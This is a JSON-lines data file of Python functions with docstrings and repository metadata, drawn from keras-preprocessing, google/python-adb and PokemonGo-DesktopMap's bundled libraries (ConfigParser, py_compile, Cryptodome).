{"docstring": "\"\"\"Test of Out of Vocabulary (OOV) flag in text.Tokenizer\n\"\"\"\n", "func_signal": "def test_tokenizer_oov_flag():\n", "code": "x_train = ['This text has only known words']\nx_test = ['This text has some unknown words']  # 2 OOVs: some, unknown\n\n# Default, without OOV flag\ntokenizer = text.Tokenizer()\ntokenizer.fit_on_texts(x_train)\nx_test_seq = tokenizer.texts_to_sequences(x_test)\nassert len(x_test_seq[0]) == 4  # discards 2 OOVs\n\n# With OOV feature\ntokenizer = text.Tokenizer(oov_token='<unk>')\ntokenizer.fit_on_texts(x_train)\nx_test_seq = tokenizer.texts_to_sequences(x_test)\nassert len(x_test_seq[0]) == 6  # OOVs marked in place", "path": "keras-preprocessing/tests/text_test.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"This will fail if not provided by a Numpy array.\nNote: This is made to enforce backward compatibility.\n\"\"\"\n\n", "func_signal": "def preprocessing_function(x):\n", "code": "assert x.shape == (26, 26, 3)\nassert type(x) is np.ndarray\n\nreturn np.zeros_like(x)", "path": "keras-preprocessing/tests/image/directory_iterator_test.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Class labels of every observation\"\"\"\n", "func_signal": "def labels(self):\n", "code": "raise NotImplementedError(\n    '`labels` property method has not been implemented in {}.'\n    .format(type(self).__name__)\n)", "path": "keras-preprocessing/keras_preprocessing/image/iterator.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Parses a JSON timeseries generator configuration file and\nreturns a timeseries generator instance.\n\n# Arguments\n    json_string: JSON string encoding a timeseries\n        generator configuration.\n\n# Returns\n    A Keras TimeseriesGenerator instance\n\"\"\"\n", "func_signal": "def timeseries_generator_from_json(json_string):\n", "code": "full_config = json.loads(json_string)\nconfig = full_config.get('config')\n\ndata = json.loads(config.pop('data'))\nconfig['data'] = data\ntargets = json.loads(config.pop('targets'))\nconfig['targets'] = targets\n\nreturn TimeseriesGenerator(**config)", "path": "keras-preprocessing/keras_preprocessing/sequence.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Converts a PIL Image instance to a Numpy array.\n\n# Arguments\n    img: PIL Image instance.\n    data_format: Image data format,\n        either \"channels_first\" or \"channels_last\".\n    dtype: Dtype to use for the returned array.\n\n# Returns\n    A 3D Numpy array.\n\n# Raises\n    ValueError: if invalid `img` or `data_format` is passed.\n\"\"\"\n", "func_signal": "def img_to_array(img, data_format='channels_last', dtype='float32'):\n", "code": "if data_format not in {'channels_first', 'channels_last'}:\n    raise ValueError('Unknown data_format: %s' % data_format)\n# Numpy array x has format (height, width, channel)\n# or (channel, height, width)\n# but original PIL image has format (width, height, channel)\nx = np.asarray(img, dtype=dtype)\nif len(x.shape) == 3:\n    if data_format == 'channels_first':\n        x = x.transpose(2, 0, 1)\nelif len(x.shape) == 2:\n    if data_format == 'channels_first':\n        x = x.reshape((1, x.shape[0], x.shape[1]))\n    else:\n        x = x.reshape((x.shape[0], x.shape[1], 1))\nelse:\n    raise ValueError('Unsupported image shape: %s' % (x.shape,))\nreturn x", "path": "keras-preprocessing/keras_preprocessing/image/utils.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Keep only dataframe rows with valid filenames\n\n# Arguments\n    df: Pandas dataframe containing filenames in a column\n    x_col: string, column in `df` that contains the filenames or filepaths\n\n# Returns\n    absolute paths to image files\n\"\"\"\n", "func_signal": "def _filter_valid_filepaths(self, df, x_col):\n", "code": "filepaths = df[x_col].map(\n    lambda fname: os.path.join(self.directory, fname)\n)\nmask = filepaths.apply(validate_filename, args=(self.white_list_formats,))\nn_invalid = (~mask).sum()\nif n_invalid:\n    warnings.warn(\n        'Found {} invalid image filename(s) in x_col=\"{}\". '\n        'These filename(s) will be ignored.'\n        .format(n_invalid, x_col)\n    )\nreturn df[mask]", "path": "keras-preprocessing/keras_preprocessing/image/dataframe_iterator.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"For python 2.x.\n\n# Returns\n    The next batch.\n\"\"\"\n", "func_signal": "def next(self):\n", "code": "with self.lock:\n    index_array = next(self.index_generator)\n# The transformation of images is not under thread lock\n# so it can be done in parallel\nreturn self._get_batches_of_transformed_samples(index_array)", "path": "keras-preprocessing/keras_preprocessing/image/iterator.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "# Ensure self.batch_index is 0.\n", "func_signal": "def _flow_index(self):\n", "code": "self.reset()\nwhile 1:\n    if self.seed is not None:\n        np.random.seed(self.seed + self.total_batches_seen)\n    if self.batch_index == 0:\n        self._set_index_array()\n\n    if self.n == 0:\n        # Avoiding modulo by zero error\n        current_index = 0\n    else:\n        current_index = (self.batch_index * self.batch_size) % self.n\n    if self.n > current_index + self.batch_size:\n        self.batch_index += 1\n    else:\n        self.batch_index = 0\n    self.total_batches_seen += 1\n    yield self.index_array[current_index:\n                           current_index + self.batch_size]", "path": "keras-preprocessing/keras_preprocessing/image/iterator.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Converts a 3D Numpy array to a PIL Image instance.\n\n# Arguments\n    x: Input Numpy array.\n    data_format: Image data format, either \"channels_first\" or \"channels_last\".\n        Default: \"channels_last\".\n    scale: Whether to rescale the image such that minimum and maximum values\n        are 0 and 255 respectively.\n        Default: True.\n    dtype: Dtype to use.\n        Default: \"float32\".\n\n# Returns\n    A PIL Image instance.\n\n# Raises\n    ImportError: if PIL is not available.\n    ValueError: if invalid `x` or `data_format` is passed.\n\"\"\"\n", "func_signal": "def array_to_img(x, data_format='channels_last', scale=True, dtype='float32'):\n", "code": "if pil_image is None:\n    raise ImportError('Could not import PIL.Image. '\n                      'The use of `array_to_img` requires PIL.')\nx = np.asarray(x, dtype=dtype)\nif x.ndim != 3:\n    raise ValueError('Expected image array to have rank 3 (single image). '\n                     'Got array with shape: %s' % (x.shape,))\n\nif data_format not in {'channels_first', 'channels_last'}:\n    raise ValueError('Invalid data_format: %s' % data_format)\n\n# Original Numpy array x has format (height, width, channel)\n# or (channel, height, width)\n# but target PIL image has format (width, height, channel)\nif data_format == 'channels_first':\n    x = x.transpose(1, 2, 0)\nif scale:\n    x = x - np.min(x)\n    x_max = np.max(x)\n    if x_max != 0:\n        x /= x_max\n    x *= 255\nif x.shape[2] == 4:\n    # RGBA\n    return pil_image.fromarray(x.astype('uint8'), 'RGBA')\nelif x.shape[2] == 3:\n    # RGB\n    return pil_image.fromarray(x.astype('uint8'), 'RGB')\nelif x.shape[2] == 1:\n    # grayscale\n    if np.max(x) > 255:\n        # 32-bit signed integer grayscale image. PIL mode \"I\"\n        return pil_image.fromarray(x[:, :, 0].astype('int32'), 'I')\n    return pil_image.fromarray(x[:, :, 0].astype('uint8'), 'L')\nelse:\n    raise ValueError('Unsupported channel number: %s' % (x.shape[2],))", "path": "keras-preprocessing/keras_preprocessing/image/utils.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Generates random parameters for a transformation.\n\n# Arguments\n    seed: Random seed.\n    img_shape: Tuple of integers.\n        Shape of the image that is transformed.\n\n# Returns\n    A dictionary containing randomly chosen parameters describing the\n    transformation.\n\"\"\"\n", "func_signal": "def get_random_transform(self, img_shape, seed=None):\n", "code": "img_row_axis = self.row_axis - 1\nimg_col_axis = self.col_axis - 1\n\nif seed is not None:\n    np.random.seed(seed)\n\nif self.rotation_range:\n    theta = np.random.uniform(\n        -self.rotation_range,\n        self.rotation_range)\nelse:\n    theta = 0\n\nif self.height_shift_range:\n    try:  # 1-D array-like or int\n        tx = np.random.choice(self.height_shift_range)\n        tx *= np.random.choice([-1, 1])\n    except ValueError:  # floating point\n        tx = np.random.uniform(-self.height_shift_range,\n                               self.height_shift_range)\n    if np.max(self.height_shift_range) < 1:\n        tx *= img_shape[img_row_axis]\nelse:\n    tx = 0\n\nif self.width_shift_range:\n    try:  # 1-D array-like or int\n        ty = np.random.choice(self.width_shift_range)\n        ty *= np.random.choice([-1, 1])\n    except ValueError:  # floating point\n        ty = np.random.uniform(-self.width_shift_range,\n                               self.width_shift_range)\n    if np.max(self.width_shift_range) < 1:\n        ty *= img_shape[img_col_axis]\nelse:\n    ty = 0\n\nif self.shear_range:\n    shear = np.random.uniform(\n        -self.shear_range,\n        self.shear_range)\nelse:\n    shear = 0\n\nif self.zoom_range[0] == 1 and self.zoom_range[1] == 1:\n    zx, zy = 1, 1\nelse:\n    zx, zy = np.random.uniform(\n        self.zoom_range[0],\n        self.zoom_range[1],\n        2)\n\nflip_horizontal = (np.random.random() < 0.5) * self.horizontal_flip\nflip_vertical = (np.random.random() < 0.5) * self.vertical_flip\n\nchannel_shift_intensity = None\nif self.channel_shift_range != 0:\n    channel_shift_intensity = np.random.uniform(-self.channel_shift_range,\n                                                self.channel_shift_range)\n\nbrightness = None\nif self.brightness_range is not None:\n    brightness = np.random.uniform(self.brightness_range[0],\n                                   self.brightness_range[1])\n\ntransform_parameters = {'theta': theta,\n                        'tx': tx,\n                        'ty': ty,\n                        'shear': shear,\n                        'zx': zx,\n                        'zy': zy,\n                        'flip_horizontal': flip_horizontal,\n                        'flip_vertical': flip_vertical,\n                        'channel_shift_intensity': channel_shift_intensity,\n                        'brightness': brightness}\n\nreturn transform_parameters", "path": "keras-preprocessing/keras_preprocessing/image/image_data_generator.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Lists the available devices.\n\nMimics 'adb devices' output:\n  List of devices attached\n  015DB7591102001A        device        1,2\n\"\"\"\n", "func_signal": "def Devices(args):\n", "code": "for d in adb_commands.AdbCommands.Devices():\n    if args.output_port_path:\n        print('%s\\tdevice\\t%s' % (\n            d.serial_number, ','.join(str(p) for p in d.port_path)))\n    else:\n        print('%s\\tdevice' % d.serial_number)\nreturn 0", "path": "python-adb/adb/adb_debug.py", "commit_date": "2019-05-22 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Accepts responses until the expected header or a FAIL.\n\nArgs:\n  expected_header: OKAY or DATA\n  info_cb: Optional callback for text sent from the bootloader.\n  timeout_ms: Timeout in milliseconds to wait for each response.\n\nRaises:\n  FastbootStateMismatch: Fastboot responded with the wrong packet type.\n  FastbootRemoteFailure: Fastboot reported failure.\n  FastbootInvalidResponse: Fastboot responded with an unknown packet type.\n\nReturns:\n  OKAY packet's message.\n\"\"\"\n", "func_signal": "def _AcceptResponses(self, expected_header, info_cb, timeout_ms=None):\n", "code": "while True:\n    response = self.usb.BulkRead(64, timeout_ms=timeout_ms)\n    header = bytes(response[:4])\n    remaining = bytes(response[4:])\n\n    if header == b'INFO':\n        info_cb(FastbootMessage(remaining, header))\n    elif header in self.FINAL_HEADERS:\n        if header != expected_header:\n            raise FastbootStateMismatch(\n                'Expected %s, got %s', expected_header, header)\n        if header == b'OKAY':\n            info_cb(FastbootMessage(remaining, header))\n        return remaining\n    elif header == b'FAIL':\n        info_cb(FastbootMessage(remaining, header))\n        raise FastbootRemoteFailure('FAIL: %s', remaining)\n    else:\n        raise FastbootInvalidResponse(\n            'Got unknown header %s and response %s', header, remaining)", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Calls the callback with the current progress and total .\"\"\"\n", "func_signal": "def _HandleProgress(self, total, progress_callback):\n", "code": "current = 0\nwhile True:\n    current += yield\n    try:\n        progress_callback(current, total)\n    except Exception:  # pylint: disable=broad-except\n        _LOG.exception('Progress callback raised an exception. %s',\n                       progress_callback)\n        continue", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Convenience function to get an adb device from usb path or serial.\n\nArgs:\n  port_path: The filename of usb port to use.\n  serial: The serial number of the device to use.\n  default_timeout_ms: The default timeout in milliseconds to use.\n  chunk_kb: Amount of data, in kilobytes, to break fastboot packets up into\n  kwargs: handle: Device handle to use (instance of common.TcpHandle or common.UsbHandle)\n          banner: Connection banner to pass to the remote device\n          rsa_keys: List of AuthSigner subclass instances to be used for\n              authentication. The device can either accept one of these via the Sign\n              method, or we will send the result of GetPublicKey from the first one\n              if the device doesn't accept any of them.\n          auth_timeout_ms: Timeout to wait for when sending a new public key. This\n              is only relevant when we send a new public key. The device shows a\n              dialog and this timeout is how long to wait for that dialog. If used\n              in automation, this should be low to catch such a case as a failure\n              quickly; while in interactive settings it should be high to allow\n              users to accept the dialog. We default to automation here, so it's low\n              by default.\n\nIf serial specifies a TCP address:port, then a TCP connection is\nused instead of a USB connection.\n\"\"\"\n\n", "func_signal": "def ConnectDevice(self, port_path=None, serial=None, default_timeout_ms=None, chunk_kb=1024, **kwargs):\n", "code": "if 'handle' in kwargs:\n    self._handle = kwargs['handle']\n\nelse:\n    self._handle = common.UsbHandle.FindAndOpen(\n        DeviceIsAvailable, port_path=port_path, serial=serial,\n        timeout_ms=default_timeout_ms)\n\nself._protocol = FastbootProtocol(self._handle, chunk_kb)\n\nreturn self", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Lists the available devices.\n\nList of devices attached\n015DB7591102001A        device\n\"\"\"\n", "func_signal": "def Devices(args):\n", "code": "for device in fastboot.FastbootCommands.Devices():\n    print('%s\\tdevice' % device.serial_number)\nreturn 0", "path": "python-adb/adb/fastboot_debug.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Sends the data to the device, tracking progress with the callback.\"\"\"\n", "func_signal": "def _Write(self, data, length, progress_callback=None):\n", "code": "if progress_callback:\n    progress = self._HandleProgress(length, progress_callback)\n    next(progress)\nwhile length:\n    tmp = data.read(self.chunk_kb * 1024)\n    length -= len(tmp)\n    self.usb.BulkWrite(tmp)\n\n    if progress_callback and progress:\n        progress.send(len(tmp))", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Calls the callback with the current progress and total bytes written/received.\n\nArgs:\n  progress_callback: callback method that accepts filename, bytes_written and total_bytes,\n             total_bytes will be -1 for file-like objects\n\"\"\"\n", "func_signal": "def _HandleProgress(cls, progress_callback):\n", "code": "current = 0\nwhile True:\n    current += yield\n    try:\n        progress_callback(current)\n    except Exception:  # pylint: disable=broad-except\n        continue", "path": "python-adb/adb/filesync_protocol.py", "commit_date": "2018-05-31 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Read ADB messages and return FileSync packets.\"\"\"\n", "func_signal": "def Read(self, expected_ids, read_data=True):\n", "code": "if self.send_idx:\n    self._Flush()\n\n# Read one filesync packet off the recv buffer.\nheader_data = self._ReadBuffered(self.recv_header_len)\nheader = struct.unpack(self.recv_header_format, header_data)\n# Header is (ID, ...).\ncommand_id = self.wire_to_id[header[0]]\n\nif command_id not in expected_ids:\n    if command_id == b'FAIL':\n        reason = ''\n        if self.recv_buffer:\n            reason = self.recv_buffer.decode('utf-8', errors='ignore')\n        raise usb_exceptions.AdbCommandFailureException('Command failed: {}'.format(reason))\n    raise adb_protocol.InvalidResponseError(\n        'Expected one of %s, got %s' % (expected_ids, command_id))\n\nif not read_data:\n    return command_id, header[1:]\n\n# Header is (ID, ..., size).\nsize = header[-1]\ndata = self._ReadBuffered(size)\nreturn command_id, header[1:-1], data", "path": "python-adb/adb/filesync_protocol.py", "commit_date": "2018-05-31 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Executes an OEM command on the device.\n\nArgs:\n  command: Command to execute, such as 'poweroff' or 'bootconfig read'.\n  timeout_ms: Optional timeout in milliseconds to wait for a response.\n  info_cb: See Download. Messages vary based on command.\n\nReturns:\n  The final response from the device.\n\"\"\"\n", "func_signal": "def Oem(self, command, timeout_ms=None, info_cb=DEFAULT_MESSAGE_CALLBACK):\n", "code": "if not isinstance(command, bytes):\n    command = command.encode('utf8')\nreturn self._SimpleCommand(\n    b'oem %s' % command, timeout_ms=timeout_ms, info_cb=info_cb)", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"TcpHandle stub.\"\"\"\n", "func_signal": "def __init__(self, serial, timeout_ms=None):\n", "code": "self._connect = mock.MagicMock(return_value=None)\n\nsuper(StubTcp, self).__init__(serial, timeout_ms)\nself.stub_base = StubHandleBase(0, is_tcp=True)", "path": "python-adb/test/common_stub.py", "commit_date": "2018-10-04 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Constructs a FastbootProtocol instance.\n\nArgs:\n  usb: UsbHandle instance.\n  chunk_kb: Packet size. For older devices, 4 may be required.\n\"\"\"\n", "func_signal": "def __init__(self, usb, chunk_kb=1024):\n", "code": "self.usb = usb\nself.chunk_kb = chunk_kb", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"PEM encoded PKCS#8 private key -> rsa.PrivateKey.\"\"\"\n# ADB uses private RSA keys in pkcs#8 format. 'rsa' library doesn't support\n# them natively. Do some ASN unwrapping to extract naked RSA key\n# (in der-encoded form). See https://www.ietf.org/rfc/rfc2313.txt.\n# Also http://superuser.com/a/606266.\n", "func_signal": "def _load_rsa_private_key(pem):\n", "code": "try:\n    der = rsa.pem.load_pem(pem, 'PRIVATE KEY')\n    keyinfo, _ = decoder.decode(der)\n    if keyinfo[1][0] != univ.ObjectIdentifier(\n            '1.2.840.113549.1.1.1'):  # pragma: no cover\n        raise ValueError('Not a DER-encoded OpenSSL private RSA key')\n    private_key_der = keyinfo[2].asOctets()\nexcept IndexError:  # pragma: no cover\n    raise ValueError('Not a DER-encoded OpenSSL private RSA key')\nreturn rsa.PrivateKey.load_pkcs1(private_key_der, format='DER')", "path": "python-adb/adb/sign_pythonrsa.py", "commit_date": "2018-03-23 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Send/buffer FileSync packets.\n\nPackets are buffered and only flushed when this connection is read from. All\nmessages have a response from the device, so this will always get flushed.\n\nArgs:\n  command_id: Command to send.\n  data: Optional data to send, must set data or size.\n  size: Optionally override size from len(data).\n\"\"\"\n", "func_signal": "def Send(self, command_id, data=b'', size=0):\n", "code": "if data:\n    if not isinstance(data, bytes):\n        data = data.encode('utf8')\n    size = len(data)\n\nif not self._CanAddToSendBuffer(len(data)):\n    self._Flush()\nbuf = struct.pack(b'<2I', self.id_to_wire[command_id], size) + data\nself.send_buffer[self.send_idx:self.send_idx + len(buf)] = buf\nself.send_idx += len(buf)", "path": "python-adb/adb/filesync_protocol.py", "commit_date": "2018-05-31 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Reboots the device.\n\nArgs:\n    target_mode: Normal reboot when unspecified. Can specify other target\n        modes such as 'recovery' or 'bootloader'.\n    timeout_ms: Optional timeout in milliseconds to wait for a response.\n\nReturns:\n    Usually the empty string. Depends on the bootloader and the target_mode.\n\"\"\"\n", "func_signal": "def Reboot(self, target_mode=b'', timeout_ms=None):\n", "code": "return self._SimpleCommand(\n    b'reboot', arg=target_mode or None, timeout_ms=timeout_ms)", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Prints a directory listing.\n\nArgs:\n  device_path: Directory to list.\n\"\"\"\n", "func_signal": "def List(device, device_path):\n", "code": "files = device.List(device_path)\nfiles.sort(key=lambda x: x.filename)\nmaxname = max(len(f.filename) for f in files)\nmaxsize = max(len(str(f.size)) for f in files)\nfor f in files:\n    mode = (\n            ('d' if stat.S_ISDIR(f.mode) else '-') +\n            ('r' if f.mode & stat.S_IRUSR else '-') +\n            ('w' if f.mode & stat.S_IWUSR else '-') +\n            ('x' if f.mode & stat.S_IXUSR else '-') +\n            ('r' if f.mode & stat.S_IRGRP else '-') +\n            ('w' if f.mode & stat.S_IWGRP else '-') +\n            ('x' if f.mode & stat.S_IXGRP else '-') +\n            ('r' if f.mode & stat.S_IROTH else '-') +\n            ('w' if f.mode & stat.S_IWOTH else '-') +\n            ('x' if f.mode & stat.S_IXOTH else '-'))\n    t = time.gmtime(f.mtime)\n    yield '%s %*d %04d-%02d-%02d %02d:%02d:%02d %-*s\\n' % (\n        mode, maxsize, f.size,\n        t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec,\n        maxname, f.filename)", "path": "python-adb/adb/adb_debug.py", "commit_date": "2019-05-22 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "# Ensure recv buffer has enough data.\n", "func_signal": "def _ReadBuffered(self, size):\n", "code": "while len(self.recv_buffer) < size:\n    _, data = self.adb.ReadUntil(b'WRTE')\n    self.recv_buffer += data\n\nresult = self.recv_buffer[:size]\nself.recv_buffer = self.recv_buffer[size:]\nreturn result", "path": "python-adb/adb/filesync_protocol.py", "commit_date": "2018-05-31 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "# Use an unbuffered version of stdout.\n", "func_signal": "def _InfoCb(message):\n", "code": "if not message.message:\n    return\nsys.stdout.write('%s: %s\\n' % (message.header, message.message))\nsys.stdout.flush()", "path": "python-adb/adb/fastboot_debug.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Runs a command on the device and prints the stdout.\n\nArgs:\n  command: Command to run on the target.\n\"\"\"\n", "func_signal": "def Shell(device, *command):\n", "code": "if command:\n    return device.StreamingShell(' '.join(command))\nelse:\n    # Retrieve the initial terminal prompt to use as a delimiter for future reads\n    terminal_prompt = device.InteractiveShell()\n    print(terminal_prompt.decode('utf-8'))\n\n    # Accept user input in a loop and write that into the interactive shells stdin, then print output\n    while True:\n        cmd = input('> ')\n        if not cmd:\n            continue\n        elif cmd == 'exit':\n            break\n        else:\n            stdout = device.InteractiveShell(cmd, strip_cmd=True, delim=terminal_prompt, strip_delim=True)\n            if stdout:\n                if isinstance(stdout, bytes):\n                    stdout = stdout.decode('utf-8')\n                    print(stdout)\n\n    device.Close()", "path": "python-adb/adb/adb_debug.py", "commit_date": "2019-05-22 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Useful wrapper around Read.\"\"\"\n", "func_signal": "def ReadUntil(self, expected_ids, *finish_ids):\n", "code": "while True:\n    cmd_id, header, data = self.Read(expected_ids + finish_ids)\n    yield cmd_id, header, data\n    if cmd_id in finish_ids:\n        break", "path": "python-adb/adb/filesync_protocol.py", "commit_date": "2018-05-31 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Sends a command to the device.\n\nArgs:\n  command: The command to send.\n  arg: Optional argument to the command.\n\"\"\"\n", "func_signal": "def SendCommand(self, command, arg=None):\n", "code": "if arg is not None:\n    if not isinstance(arg, bytes):\n        arg = arg.encode('utf8')\n    command = b'%s:%s' % (command, arg)\n\nself._Write(io.BytesIO(command), len(command))", "path": "python-adb/adb/fastboot.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "google/python-adb", "stars": 1747, "license": "apache-2.0", "language": "python", "size": 183}
{"docstring": "\"\"\"Compile several source files.\n\nThe files named in 'args' (or on the command line, if 'args' is\nnot specified) are compiled and the resulting bytecode is cached\nin the normal manner.  This function does not search a directory\nstructure to locate source files; it only compiles files named\nexplicitly.  If '-' is the only parameter in args, the list of\nfiles is taken from standard input.\n\n\"\"\"\n", "func_signal": "def main(args=None):\n", "code": "if args is None:\n    args = sys.argv[1:]\nrv = 0\nif args == ['-']:\n    while True:\n        filename = sys.stdin.readline()\n        if not filename:\n            break\n        filename = filename.rstrip('\\n')\n        try:\n            compile(filename, doraise=True)\n        except PyCompileError as error:\n            rv = 1\n            sys.stderr.write(\"%s\\n\" % error.msg)\n        except IOError as error:\n            rv = 1\n            sys.stderr.write(\"%s\\n\" % error)\nelse:\n    for filename in args:\n        try:\n            compile(filename, doraise=True)\n        except PyCompileError as error:\n            # return value to indicate at least one failure\n            rv = 1\n            sys.stderr.write(\"%s\\n\" % error.msg)\nreturn rv", "path": "PokemonGo-DesktopMap/app/pywin/Lib/py_compile.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Get an option value for a given section.\n\nIf `vars' is provided, it must be a dictionary. The option is looked up\nin `vars' (if provided), `section', and in `defaults' in that order.\n\nAll % interpolations are expanded in the return values, unless the\noptional argument `raw' is true. Values for interpolation keys are\nlooked up in the same manner as the option.\n\nThe section DEFAULT is special.\n\"\"\"\n", "func_signal": "def get(self, section, option, raw=False, vars=None):\n", "code": "sectiondict = {}\ntry:\n    sectiondict = self._sections[section]\nexcept KeyError:\n    if section != DEFAULTSECT:\n        raise NoSectionError(section)\n# Update with the entry specific variables\nvardict = {}\nif vars:\n    for key, value in vars.items():\n        vardict[self.optionxform(key)] = value\nd = _Chainmap(vardict, sectiondict, self._defaults)\noption = self.optionxform(option)\ntry:\n    value = d[option]\nexcept KeyError:\n    raise NoOptionError(option, section)\n\nif raw or value is None:\n    return value\nelse:\n    return self._interpolate(section, option, value, d)", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Encrypt data with the key set at initialization.\n\nThe data to encrypt can be broken up in two or\nmore pieces and `encrypt` can be called multiple times.\n\nThat is, the statement:\n\n    >>> c.encrypt(a) + c.encrypt(b)\n\nis equivalent to:\n\n     >>> c.encrypt(a+b)\n\nThis function does not add any padding to the plaintext.\n\n:Parameters:\n  plaintext : byte string\n    The piece of data to encrypt.\n    The length must be multiple of the cipher block length.\n:Return:\n    the encrypted data, as a byte string.\n    It is as long as *plaintext*.\n\"\"\"\n\n", "func_signal": "def encrypt(self, plaintext):\n", "code": "expect_byte_string(plaintext)\nciphertext = create_string_buffer(len(plaintext))\nresult = raw_ecb_lib.ECB_encrypt(self._state.get(),\n                                 plaintext,\n                                 ciphertext,\n                                 c_size_t(len(plaintext)))\nif result:\n    raise ValueError(\"Error %d while encrypting in ECB mode\" % result)\nreturn get_raw_buffer(ciphertext)", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Cipher/_mode_ecb.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Return a new instance of a BLAKE2s hash object.\"\"\"\n\n", "func_signal": "def new(self, **kwargs):\n", "code": "if \"digest_bytes\" not in kwargs and \"digest_bits\" not in kwargs:\n    kwargs[\"digest_bytes\"] = self.digest_size\n\nreturn new(**kwargs)", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Hash/BLAKE2s.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Check for the existence of a given option in a given section.\"\"\"\n", "func_signal": "def has_option(self, section, option):\n", "code": "if not section or section == DEFAULTSECT:\n    option = self.optionxform(option)\n    return option in self._defaults\nelif section not in self._sections:\n    return False\nelse:\n    option = self.optionxform(option)\n    return (option in self._sections[section]\n            or option in self._defaults)", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
